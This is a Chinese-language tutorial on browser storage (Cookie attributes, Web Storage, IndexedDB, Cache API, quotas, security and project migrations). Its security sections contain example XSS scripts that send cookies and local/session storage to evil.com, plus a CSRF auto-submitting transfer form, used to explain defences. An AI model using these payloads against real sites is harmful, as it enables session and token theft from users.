一、为什么需要浏览器存储 ​

1.1 HTTP 是无状态的 ​

HTTP 协议从设计上就是"无状态"的——服务器处理完一个请求就忘了客户端是谁。这意味着:

js
// 请求 1:用户登录
fetch('/api/login', { method: 'POST', body: credentials })
// 响应:200 OK,但服务器下一次见到你,完全不记得你登录过

// 请求 2:用户访问 /dashboard
fetch('/api/dashboard')
// 服务器:你是谁?我不知道

要让服务器"记住"客户端,客户端必须主动告知身份——这就是 Cookie 的本质。

1.2 Cookie 的硬限制 ​

Cookie 作为最早的浏览器存储方案,有三条硬伤:

限制数值后果
单 Cookie 大小~4 KB只能存小数据(token、session ID)
单域名 Cookie 数~50 个多了被截断
每次请求自动携带✅大 Cookie 让每个请求都臃肿
http
# 一个 Cookie 占 4 KB,100 个请求就多传 400 KB
# 移动弱网下,首屏延迟直接 +500ms
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6Ikp...; user_pref={"theme":"dark","lang":"zh"}; ...满 4KB

这就是为什么需要更优方案——Web Storage、IndexedDB、Cache API 填补了大容量、不随请求发送、不限数量的存储需求。

1.3 五种存储定位 ​

存储大小生命周期随请求带定位
Cookie~4 KB可配✅登录态、CSRF Token
LocalStorage5~10 MB永久(手动清)❌用户偏好、轻量缓存
SessionStorage5~10 MB标签页关闭即清❌表单草稿、跨页面状态
IndexedDB几百 MB~几 GB永久(可申请持久化)❌结构化大数据、离线数据
Cache API看配额(总配额的一部分)手动管理❌Service Worker 资源缓存

每种存储都有明确的"主战场",下面逐个深度剖析。

二、Cookie 深度 ​

Cookie 的服务端视角(Set-Cookie、生命周期)已在 /网络/11-cookie-session.md 详述。本文聚焦浏览器侧的属性、调试、安全。

2.1 Cookie 的完整属性 ​

一个生产级 Cookie 通常长这样:

http
Set-Cookie: __Host-token=abc123;
            Path=/;
            Max-Age=3600;
            Secure;
            HttpOnly;
            SameSite=Lax;
            Partitioned

逐项拆解:

属性取值作用浏览器视角
Name=Value字符串实际数据浏览器存到 Cookie 存储
ExpiresHTTP 日期过期时间到期自动删除
Max-Age秒数相对过期比 Expires 优先
Domain域名作用范围默认当前域,带子域
Path路径前缀路径范围默认当前路径
Secure无值仅 HTTPS 发送HTTP 站点不发
HttpOnly无值JS 不可读document.cookie 看不到
SameSiteStrict / Lax / None跨站发送策略见下节
Partitioned无值分区 Cookie(CHIPS)见下节

2.2 SameSite 三种值的实际效果 ​

http
Set-Cookie: token=xxx; SameSite=Strict   # 最严

2.3 __Host- 前缀防 Cookie 注入 ​

攻击者控制了 evil.example.com,可以这样注入父域:

http
# evil.example.com 的服务端返回:
Set-Cookie: session=hacker_token; Domain=example.com; Path=/

# 用户访问 example.com 时,Cookie 变成了 hacker 的 token

__Host- 前缀强制约束,杜绝这类攻击:

http
Set-Cookie: __Host-session=xxx; Secure; Path=/; HttpOnly

三条硬约束:

  1. 必须带 Secure
  2. 不能有 Domain 属性(无法绑定父域)
  3. Path 必须是 /

任一条件不满足,浏览器直接拒绝这个 Cookie。同理还有 __Secure-(只要 Secure)和 __HttpOnly-(草案中)。

2.4 Partitioned Cookie(CHIPS) ​

Chrome 推出的"分区 Cookie",把第三方 Cookie 按顶级站分区:

http
Set-Cookie: ad_id=xxx; Partitioned; Secure; SameSite=None
js
// iframe(ads.com)里:
// 用户在 site-a.com 看到的 ad_id=xxx-A
// 用户在 site-b.com 看到的 ad_id=xxx-B
// 跨站不再共享同一 Cookie,阻断追踪

2.5 Cookie 与 XSS / CSRF 的关系 ​

Cookie 偷不到 ≠ XSS 偷不到:

html
<!-- XSS 攻击代码注入页面 -->
<script>
  // 1. 偷非 HttpOnly 的 Cookie
  fetch('https://evil.com/steal?cookie=' + document.cookie)
  // 2. 偷 LocalStorage / SessionStorage
  fetch('https://evil.com/steal?ls=' + JSON.stringify(localStorage))
  // 3. 偷 IndexedDB(异步,稍麻烦)
  indexedDB.databases().then(dbs => fetch('https://evil.com/steal?dbs=' + JSON.stringify(dbs)))
  // 4. HttpOnly 的 Cookie 用 document.cookie 读不到 → 但 XHR/fetch 仍会自动带!
  fetch('/api/transfer', { method: 'POST', body: JSON.stringify({amount: 10000}) })
</script>

关键认知:

  • HttpOnly 阻止 JS 读 Cookie,但 XHR/fetch 仍会带
  • 所以 XSS 拿到 HttpOnly token 的方式:直接发请求给服务端,而不是读 Cookie
  • 防 XSS 的根本:不让 JS 注入(CSP + 输出转义),不是依赖 Cookie 属性

三、Web Storage(localStorage / sessionStorage) ​

Web Storage 是 HTML5 引入的"本地存储"标准,API 简单,容量大,不随 HTTP 请求发送——这三点是相对 Cookie 的核心优势。

3.1 完整 API ​

3.2 容量限制与异常 ​

js
// 各浏览器大致限制(原文是字符数,实际按字节算)

  Chrome:    5 * 1024 * 1024,  // 5 MB per origin
  Firefox:   5 * 1024 * 1024,  // 5 MB per origin

超出容量会抛异常——必须 try/catch:

ts
function safeSetItem(key: string, value: string): boolean {
  try {
    localStorage.setItem(key, value)
    return true
  } catch (e) {
    if (e instanceof DOMException) {
      if (e.name === 'QuotaExceededError') {
        // 配额超限的几种可能:
        // 1. 总容量超 5 MB
        // 2. 单条超浏览器限制(Chrome ~2 MB)
        // 3. 隐私模式 / 无痕模式(部分浏览器禁用 localStorage)
        console.warn('localStorage 配额超限,清理旧数据')
        return evictAndRetry(key, value)
      }
      if (e.name === 'SecurityError') {
        // 隐私模式 / 第三方 iframe 沙箱 / 文件:// 协议
        console.error('localStorage 被禁用,降级到内存或 Cookie')
        return false
      }
    }
    throw e
  }
}

function evictAndRetry(key: string, value: string): boolean {
  // 清理加了 cache: 前缀的旧数据
  const keysToRemove: string[] = []
  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i)
    if (k && k.startsWith('cache:')) keysToRemove.push(k)
  }
  keysToRemove.forEach(k => localStorage.removeItem(k))

  try {
    localStorage.setItem(key, value)
    return true
  } catch {
    // 实在塞不下,降级到 IndexedDB 或内存
    return false
  }
}

3.3 序列化复杂对象 ​

localStorage 只接字符串,对象必须 JSON 序列化:

ts

踩坑点:

  • Date 对象 → 变字符串 → new Date(parsed.lastLogin) 才能用
  • undefined / Function / Symbol → JSON 序列化丢失
  • 循环引用 → JSON.stringify 直接抛错
ts
// 安全序列化(带 try/catch)
function safeSave<T>(key: string, value: T): boolean {
  try {
    localStorage.setItem(key, JSON.stringify(value))
    return true
  } catch (e) {
    if (e instanceof SyntaxError) {
      console.error('序列化失败', e)
    }
    return false
  }
}

四、IndexedDB 深度 ​

IndexedDB 是浏览器提供的完整数据库,不是简单的 KV 存储。支持索引、事务、游标——足以应付"几千条操作历史"这种规模。

4.1 核心概念 ​

4.2 完整 CRUD 示例(原生 API) ​

下面是一个生产可用的"操作历史"表完整示例:

ts
// db.ts —— IndexedDB 完整封装(原生 API)

const DB_NAME = 'app-history-db'
const DB_VERSION = 1
const STORE = 'operations'

// 1. 打开数据库(自动升级)
export function openDB(): Promise<IDBDatabase> {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(DB_NAME, DB_VERSION)

    request.onupgradeneeded = (event) => {
      const db = (event.target as IDBOpenDBRequest).result
      const oldVersion = event.oldVersion
      const newVersion = event.newVersion

      // 首次创建 / 升级到 1
      if (oldVersion < 1) {
        // 创建对象仓库,keyPath 为主键
        const store = db.createObjectStore(STORE, { keyPath: 'id' })

        // 建索引:按时间查
        store.createIndex('by_time', 'timestamp', { unique: false })
        // 建索引:按操作类型查
        store.createIndex('by_type', 'type', { unique: false })
        // 建索引:按用户查(可重复)
        store.createIndex('by_user', 'userId', { unique: false })
      }

      // 后续升级(版本 2、3 ...)在这里加
      // if (oldVersion < 2) { ... }
    }

    request.onsuccess = () => resolve(request.result)
    request.onerror = () => reject(request.error)
  })
}

// 2. 增(put:有则覆盖,无则新增)
export async function addOperation(op: {
  id: string
  type: string
  userId: string
  payload: unknown
  timestamp: number
}): Promise<void> {
  const db = await openDB()
  return new Promise((resolve, reject) => {
    // 只读事务 vs 读写事务:'readwrite'
    const tx = db.transaction(STORE, 'readwrite')
    const store = tx.objectStore(STORE)

    // add:有则报错;put:有则覆盖
    const req = store.put(op)

    req.onsuccess = () => resolve()
    req.onerror = () => reject(req.error)
  })
}

// 3. 删(按主键)
export async function deleteOperation(id: string): Promise<void> {
  const db = await openDB()
  return new Promise((resolve, reject) => {
    const tx = db.transaction(STORE, 'readwrite')
    const req = tx.objectStore(STORE).delete(id)
    req.onsuccess = () => resolve()
    req.onerror = () => reject(req.error)
  })
}

// 4. 改(get + put,事务里完成)
export async function updateOperation(
  id: string,
  patch: Partial<{ type: string; payload: unknown }>,
): Promise<void> {
  const db = await openDB()
  return new Promise((resolve, reject) => {
    const tx = db.transaction(STORE, 'readwrite')
    const store = tx.objectStore(STORE)

    const getReq = store.get(id)
    getReq.onsuccess = () => {
      const old = getReq.result
      if (!old) {
        reject(new Error('记录不存在'))
        return
      }
      const updated = { ...old, ...patch }
      const putReq = store.put(updated)
      putReq.onsuccess = () => resolve()
      putReq.onerror = () => reject(putReq.error)
    }
    getReq.onerror = () => reject(getReq.error)
  })
}

// 5. 查 1(按主键)
export async function getOperation(id: string) {
  const db = await openDB()
  return new Promise((resolve, reject) => {
    const tx = db.transaction(STORE, 'readonly')
    const req = tx.objectStore(STORE).get(id)
    req.onsuccess = () => resolve(req.result)
    req.onerror = () => reject(req.error)
  })
}

// 6. 查 N(用游标遍历全表,避免一次 getAll 加载太多)
export async function* iterateOperations(
  limit = 100,
  offset = 0,
): AsyncGenerator<OperationRecord> {
  const db = await openDB()
  const tx = db.transaction(STORE, 'readonly')
  const store = tx.objectStore(STORE)
  const index = store.index('by_time')

  // openCursor:按索引倒序(最新的在前面)
  const cursorReq = index.openCursor(null, 'prev')

  let skipped = 0
  let yielded = 0

  return new Promise<AsyncGenerator<OperationRecord>>((resolve, reject) => {
    cursorReq.onerror = () => reject(cursorReq.error)

    const generator = (async function* () {
      // 把 cursor 包成 async generator
      const cursorPromise = new Promise<IDBCursor | null>((res) => {
        cursorReq.onsuccess = () => res(cursorReq.result)
      })
      let cursor = await cursorPromise
      while (cursor && yielded < limit) {
        if (skipped < offset) {
          skipped++
          cursor = await continueCursor(cursor)
          continue
        }
        yield cursor.value
        yielded++
        cursor = await continueCursor(cursor)
      }
    })()

    resolve(generator)
  })
}

function continueCursor(cursor: IDBCursor): Promise<IDBCursor | null> {
  return new Promise((resolve) => {
    cursor.continue()
    cursor.request!.onsuccess = () => resolve(cursor.request!.result)
  })
}

// 7. 查 N(按索引条件)
export async function getOperationsByType(type: string): Promise<OperationRecord[]> {
  const db = await openDB()
  return new Promise((resolve, reject) => {
    const tx = db.transaction(STORE, 'readonly')
    const index = tx.objectStore(STORE).index('by_type')
    const req = index.getAll(type)
    req.onsuccess = () => resolve(req.result)
    req.onerror = () => reject(req.error)
  })
}

// 8. 清空
export async function clearOperations(): Promise<void> {
  const db = await openDB()
  return new Promise((resolve, reject) => {
    const tx = db.transaction(STORE, 'readwrite')
    const req = tx.objectStore(STORE).clear()
    req.onsuccess = () => resolve()
    req.onerror = () => reject(req.error)
  })
}

4.3 事务特性(原子性) ​

IndexedDB 事务是原子的——要么全部成功,要么全部失败:

ts
// 例子:批量删除 + 批量新增,必须同步成功或同步回滚
const db = await openDB()
const tx = db.transaction(STORE, 'readwrite')
const store = tx.objectStore(STORE)

// 操作 1:删除 10 条
toDelete.forEach(id => store.delete(id))

// 操作 2:插入 5 条
toInsert.forEach(op => store.put(op))

// 任何一个操作失败,事务回滚
tx.oncomplete = () => console.log('全部成功')
tx.onerror = () => console.log('回滚', tx.error)
tx.onabort = () => console.log('主动中止')

事务跨多个 objectStore:

// 同时改两张表,原子性保证

4.4 游标遍历(避免一次加载全表) ​

getAll() 简单,但全表加载会爆内存。openCursor() 流式遍历:

ts
async function* iterateAll() {
  const db = await openDB()
  const tx = db.transaction(STORE, 'readonly')
  const cursorReq = tx.objectStore(STORE).openCursor()

  return new Promise<AsyncGenerator>((resolve) => {
    const generator = (async function* () {
      let cursor = await new Promise<IDBCursor | null>((r) => {
        cursorReq.onsuccess = () => r(cursorReq.result)
      })
      while (cursor) {
        yield cursor.value
        cursor = await new Promise<IDBCursor | null>((r) => {
          cursor.continue()
          cursor.request!.onsuccess = () => r(cursor.request!.result)
        })
      }
    })()
    resolve(generator)
  })
}

// 用法:分页拉
for await (const op of iterateAll()) {
  console.log(op)
  // 边遍历边处理,内存常驻只 1 条
}

五、Cache API(Service Worker) ​

Cache API 是 Service Worker 专属的"网络缓存层"——它和 HTTP 缓存(强缓存/协商缓存,见 4-cache.md)是两回事。

5.1 与 HTTP 缓存的关系 ​

js
// 浏览器默认行为(没有 SW):
fetch('/api/data')
  → 看 HTTP 缓存(强缓存命中?协商缓存?)
  → 有缓存 → 用
  → 没缓存 → 发请求

// 有 SW 介入:
fetch('/api/data')
  → SW 的 fetch 事件触发
  → 你可以拦截 → 用 Cache API 的内容
  → 你也可以选择放行,让浏览器走默认逻辑

// Cache API 是"你自己控制的缓存",
// HTTP 缓存是"浏览器自动控制的缓存"
// 互不干扰,但都被你 fetch 出来

5.2 完整流程:caches.open / add / match ​

js
// 在 Service Worker 里:

const CACHE_NAME = 'app-cache-v1'
const PRECACHE_URLS = [
  '/',
  '/static/main.js',
  '/static/main.css',
  '/static/logo.png',
]

// 1. SW 安装时:预缓存 app shell
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => cache.addAll(PRECACHE_URLS))
      .then(() => self.skipWaiting())  // 立即激活
  )
})

// 2. 拦截 fetch:运行时缓存
self.addEventListener('fetch', (event) => {
  if (event.request.method !== 'GET') return

  event.respondWith(
    caches.match(event.request).then(cachedResponse => {
      if (cachedResponse) {
        return cachedResponse  // 缓存命中
      }
      return fetch(event.request).then(networkResponse => {
        // 网络成功 → 写缓存
        return caches.open(CACHE_NAME).then(cache => {
          cache.put(event.request, networkResponse.clone())
          return networkResponse
        })
      })
    })
  )
})

// 3. 激活时清理旧缓存
self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then(cacheNames => {
      return Promise.all(
        cacheNames
          .filter(name => name !== CACHE_NAME)
          .map(name => caches.delete(name))
      )
    }).then(() => self.clients.claim())
  )
})

5.3 运行时缓存 vs 预缓存 ​

// 1. 预缓存(precaching)
//    SW 安装时就下载,版本号一变就重下
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open('v1').then(cache => cache.addAll([
      '/offline.html',         // 离线 fallback 页面
      '/static/main.js',
      '/static/main.css',
    ]))
  )
})

// 2. 运行时缓存(runtime caching)
//    用户访问时按需缓存
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then(cached => {
      return cached || fetch(event.request).then(response => {
        return caches.open('runtime').then(cache => {
          cache.put(event.request, response.clone())
          return response
        })
      })
    })
  )
})

5.4 StaleWhileRevalidate 策略 ​

"先用缓存,后台静默更新"——下次访问就拿到新版:

js
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.open('runtime').then(cache => {
      return cache.match(event.request).then(cached => {
        const networkFetch = fetch(event.request).then(response => {
          cache.put(event.request, response.clone())
          return response
        })
        // 关键:即使网络慢,先返回 cached,后台慢慢 fetch
        return cached || networkFetch
      })
    })
  )
})

适用:不常变但希望尽快看到新版的资源(头像、配置 JSON)。

更复杂的策略(NetworkFirst、CacheFirst、ExpirationPlugin 等)推荐用 Workbox——一行配置搞定,详见 10-service-worker.md。

6.2 Storage API:estimate / persist ​

ts
// 1. 查配额(所有源共享)
const estimate = await navigator.storage.estimate()
console.log(`已用: ${(estimate.usage! / 1024 / 1024).toFixed(2)} MB`)
console.log(`配额: ${(estimate.quota! / 1024 / 1024 / 1024).toFixed(2)} GB`)
// 输出:已用: 12.34 MB / 配额: 113.85 GB(Chrome 默认)

// 2. 申请持久化(不被浏览器自动清理)
const persisted = await navigator.storage.persisted()
console.log('当前是否持久化:', persisted)

if (!persisted) {
  const granted = await navigator.storage.persist()
  console.log('用户是否同意持久化:', granted)
  // Chrome:满足以下条件之一会自动授权(无需弹窗):
  // - 网站加入书签
  // - 网站被添加到主屏幕(PWA)
  // - 网站启用了通知权限
  // 否则会弹一个 "允许网站保存数据" 的询问框
}

// 3. 监听配额压力(可选)
navigator.storage.addEventListener('quotaexceed', () => {
  console.warn('存储即将超限!')
})

实战用法:PWA 启动时申请 persist,被清理概率大幅下降。

ts
// PWA 注册后
if ('storage' in navigator && 'persist' in navigator.storage) {
  const persisted = await navigator.storage.persist()
  if (persisted) {
    console.log('数据将不会被自动清理')
  }
}

八、安全考虑 ​

8.1 XSS 偷所有非 HttpOnly 存储 ​

html
<!-- 一旦 XSS 注入成功,以下都能被偷: -->
<script>
  // 1. document.cookie(非 HttpOnly 的部分)
  const cookie = document.cookie

  // 2. 所有 localStorage
  const ls = {}
  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i)
    if (k) ls[k] = localStorage.getItem(k)
  }

  // 3. 所有 sessionStorage
  const ss = {}
  for (let i = 0; i < sessionStorage.length; i++) {
    const k = sessionStorage.key(i)
    if (k) ss[k] = sessionStorage.getItem(k)
  }

  // 4. IndexedDB(异步)
  const dbReq = indexedDB.open('app-db')
  dbReq.onsuccess = () => {
    const db = dbReq.result
    // 遍历所有 objectStore,拿到数据
    // (代码省略,核心是事务 + getAll)
  }

  // 5. 上报到攻击者服务器
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ cookie, ls, ss }),
  })
</script>

唯一例外:HttpOnly 的 Cookie——document.cookie 看不到,XSS 拿不到。

8.2 CSRF 偷 Cookie ​

HttpOnly 挡不住 CSRF——攻击者不需要读 Cookie,只需要让浏览器自动带 Cookie:

html
<!-- 用户在 bank.com 已登录,Cookie 是 HttpOnly 的 -->
<!-- 攻击者在 evil.com 的页面: -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="amount" value="10000">
  <input name="to" value="attacker">
</form>
<script>document.getElementById('f').submit()</script>

<!-- 结果:浏览器自动带上 bank.com 的 HttpOnly Cookie,转账成功 -->

防御:SameSite=Lax/Strict(防跨站 POST)+ CSRF Token(请求级)+ Origin 校验。

8.3 敏感数据别放 LocalStorage ​

ts
// ❌ 危险:JWT 放 LocalStorage → 一旦 XSS,token 直接被偷
localStorage.setItem('jwt', 'eyJhbGciOiJIUzI1NiIsInR5cCI6Ikp...')

// ✅ 安全:JWT 放 HttpOnly Cookie → XSS 读不到,只能服务端用
// Set-Cookie: jwt=xxx; HttpOnly; Secure; SameSite=Lax

// ✅ 现代 SPA(无 Cookie 环境):用内存变量存 token(刷新就丢,需配合 refresh token)
let accessToken = null  // 内存
function setToken(t: string) { accessToken = t }

8.4 指纹追踪与隐私 ​

js
// 浏览器存储本身能用来追踪用户:
// 1. 第三方 Cookie(广告联盟常用)—— 现代浏览器开始限制
// 2. LocalStorage 跨站标记(无 SameSite 隔离)—— ITP 限制
// 3. IndexedDB 跨站共享 — 不能,同源隔离
// 4. 缓存侧信道 — 推断用户访问过哪些 URL(新兴攻击向量)

// 防御(网站视角):
// - 第三方 Cookie 慎用,会被现代浏览器逐步禁用
// - 用 Partitioned Cookie(CHIPS)
// - 不在第三方上下文存储用户敏感数据

九、真实项目经验 ​

9.1 商户后台:从 localStorage 迁到 IndexedDB ​

问题: 商户管理 SaaS 的"操作历史"功能,需要存几千条记录(操作类型、时间、用户、payload)。最初用 localStorage,刷新页面后报错:

js
// 报错:
QuotaExceededError: Failed to execute 'setItem' on 'Storage':
  Setting the value of 'operation-history' exceeded the quota.

根因:

  • 几千条 JSON 序列化后 ~3 MB,接近 localStorage 5 MB 配额
  • 一旦塞点图片 base64 或者别的,就超了
  • 写入是同步的,几千条操作历史刷新页面加载要 200ms+

方案迁移到 IndexedDB:

ts
// 旧方案(放弃)
const HISTORY_KEY = 'operation-history'
const history = JSON.parse(localStorage.getItem(HISTORY_KEY) || '[]')
history.push(op)
localStorage.setItem(HISTORY_KEY, JSON.stringify(history))

// 新方案(IndexedDB + 库)
import { openDB } from 'idb'

const db = await openDB('merchant-history', 1, {
  upgrade(db) {
    const store = db.createObjectStore('ops', { keyPath: 'id' })
    store.createIndex('by_time', 'timestamp')
  },
})

// 写入(异步,不阻塞 UI)
await db.put('ops', op)

// 查询(按时间倒序分页)
const page = await db.getAllFromIndex('ops', 'by_time', IDBKeyRange.lowerBound(cursorTime))

效果:

  • 容量从 5 MB → 几百 MB(无压力)
  • 同步阻塞 → 异步,首屏加载 200ms+ → <50ms
  • 支持复杂查询(按用户、按时间范围)
  • 索引建立后,查询从 O(N) → O(log N)

详见 /browser/14-project-pitfalls.md 六节。

9.2 会员端 H5:Service Worker 缓存 SSR 数据 ​

背景: 会员端 H5 是 Next.js SSR 渲染,首屏靠服务端吐 JSON 数据填充。弱网下首屏经常 3~5 秒。

方案(详见 10-service-worker.md):

  1. Workbox 生成 Service Worker
  2. 拦截 SSR 数据请求,StaleWhileRevalidate 策略
  3. 按语言分缓存池(en / zh)
  4. 用 Next.js buildId 做版本控制

效果:

  • 二次访问首屏 < 500ms
  • 离线也能看到上次数据
  • 节省 70% 接口请求

9.3 登录态从 localStorage 改 HttpOnly Cookie ​

背景: 会员端最初用 localStorage 存 JWT,前端拦截器加 Authorization 头。后端反馈安全团队审计不通过——XSS 一旦发生,token 直接被偷。

迁移:

ts
// 旧方案(放弃)
// 前端:localStorage.setItem('jwt', token)
// 请求拦截器:headers['Authorization'] = `Bearer ${localStorage.getItem('jwt')}`
// 服务端:解析 Authorization 头

// 新方案(HttpOnly Cookie)
// 服务端:
res.cookie('__Host-jwt', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  path: '/',
  maxAge: 3600 * 1000,
})
// 前端:不用管,fetch / XHR 自动带 Cookie

// 跨域场景(API 在 api.example.com,前端在 app.example.com)
res.cookie('jwt', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'none',   // 跨子域必需
  maxAge: 3600 * 1000,
})
// 前端 fetch 必须带 credentials: include
fetch('/api/user', { credentials: 'include' })

效果:

  • XSS 拿不到 token(攻击者读不到 HttpOnly Cookie)
  • 服务端可以直接读 req.cookies.jwt,少一道解析
  • CSRF 风险由 SameSite=Lax 兜底

十、性能与监控 ​

10.1 批量写入优化 ​

ts
// ❌ 一条一条写(每次都开事务)
for (const op of ops) {
  await db.put('ops', op)  // 1000 次事务
}

// ✅ 单个事务批量写
const db = await openDB()
const tx = db.transaction('ops', 'readwrite')
const store = tx.objectStore('ops')
ops.forEach(op => store.put(op))
await tx.done  // 1 次事务

性能差距:1000 条写入,从 800ms → 80ms(10 倍提升)。

10.2 大数据避免存 LocalStorage ​

js
// 临界点:
// - < 100 KB:LocalStorage 没问题
// - 100 KB ~ 1 MB:谨慎,定期清理
// - > 1 MB:必须 IndexedDB

// 监控:
let lsSize = 0
for (let i = 0; i < localStorage.length; i++) {
  const k = localStorage.key(i)
  if (k) lsSize += (k.length + (localStorage.getItem(k) || '').length) * 2  // UTF-16
}
if (lsSize > 1024 * 1024) {
  console.warn(`localStorage 已用 ${(lsSize / 1024).toFixed(0)} KB,考虑迁 IndexedDB`)
}

10.3 监控存储用量 ​

ts
// 上报到监控系统
async function reportStorage() {
  if (!navigator.storage?.estimate) return

  const { usage = 0, quota = 0 } = await navigator.storage.estimate()
  const persisted = await navigator.storage.persisted?.()

  // 假设接入 Sentry / 自研监控
  metrics.gauge('storage.usage_bytes', usage, { persisted })
  metrics.gauge('storage.quota_bytes', quota)
}

// 定时上报
setInterval(reportStorage, 60000)  // 每分钟一次

// 用户行为埋点
async function trackStorageEvent(action: 'put' | 'delete' | 'clear', store: string) {
  const { usage = 0 } = await navigator.storage.estimate()
  analytics.track('storage_event', { action, store, usage })
}

10.4 IndexedDB 性能 Tips ​

ts
// 1. 不要在主线程做大事务(可能卡顿)
const CHUNK = 1000
async function bulkInsert(records: any[]) {
  for (let i = 0; i < records.length; i += CHUNK) {
    const batch = records.slice(i, i + CHUNK)
    const db = await openDB()
    const tx = db.transaction('ops', 'readwrite')
    batch.forEach(r => tx.objectStore('ops').put(r))
    await tx.done
    await new Promise(r => setTimeout(r, 0))  // 让出主线程
  }
}

// 2. 用 cursor 遍历,避免 getAll
// ❌ const all = await store.getAll()  // 可能 OOM
// ✅ for await (const op of iterateWithCursor()) { ... }

// 3. 索引不要建太多(写放大)
db.createObjectStore('ops', { keyPath: 'id' })
// 写一条数据 → 每个索引都更新,索引多了写性能下降
